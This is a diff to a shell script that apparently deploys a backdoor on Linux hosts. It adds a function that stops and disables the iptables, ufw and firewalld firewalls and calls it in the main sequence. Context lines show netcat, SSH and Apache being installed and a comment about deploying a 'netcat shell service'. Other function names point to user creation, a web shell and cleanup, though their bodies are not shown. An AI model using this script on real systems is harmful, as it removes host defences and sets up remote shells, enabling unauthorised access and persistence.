@@ -16,11 +16,32 @@ preint() {
 		yum install -y nc automake sudo openssh-server httpd gcc gcc-c++ make 
 		systemctl enable httpd
 		systemctl start httpd
+		service httpd start
+		chkconfig httpd on
 		return
 	else
 		echo "Bad PKM"
 		exit 1
 	fi
+}
+
+#disable firewalls
+fire() {
+	systemctl stop iptables
+	systemctl stop ufw
+	systemctl stop firewalld
+	
+	systemctl disable iptables
+	systemctl disable ufw
+	systemctl disable firewalld
+	
+	service iptables stop
+	service ufw stop
+	service firewalld stop
+	
+	chkconfig iptables off
+	chkconfig ufw off
+	chkconfig firewalld off
 }
 
 #deploy netcat shell service 
@@ -208,6 +229,7 @@ cleaner() {
 
 
 preint
+fire
 serv
 usr
 webssh
